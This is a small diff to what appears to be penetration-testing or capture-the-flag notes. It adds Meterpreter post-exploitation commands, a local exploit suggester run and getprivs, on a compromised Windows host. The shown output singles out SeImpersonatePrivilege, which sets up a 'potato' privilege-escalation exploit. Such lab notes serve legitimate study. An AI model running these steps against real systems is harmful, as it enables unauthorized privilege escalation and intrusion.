@@ -217,6 +217,18 @@ sessions 1
 
 getuid
 #kohsuke
+run post/multi/recon/local_exploit_suggester 
+getprivs
+#Output:
+ SeChangeNotifyPrivilege
+ SeCreateGlobalPrivilege
+--------->SeImpersonatePrivilege<-------------
+ SeIncreaseWorkingSetPrivilege
+ SeShutdownPrivilege
+ SeTimeZonePrivilege
+ SeUndockPrivilege
+
+
 #now we can try potato exploit
 
 background
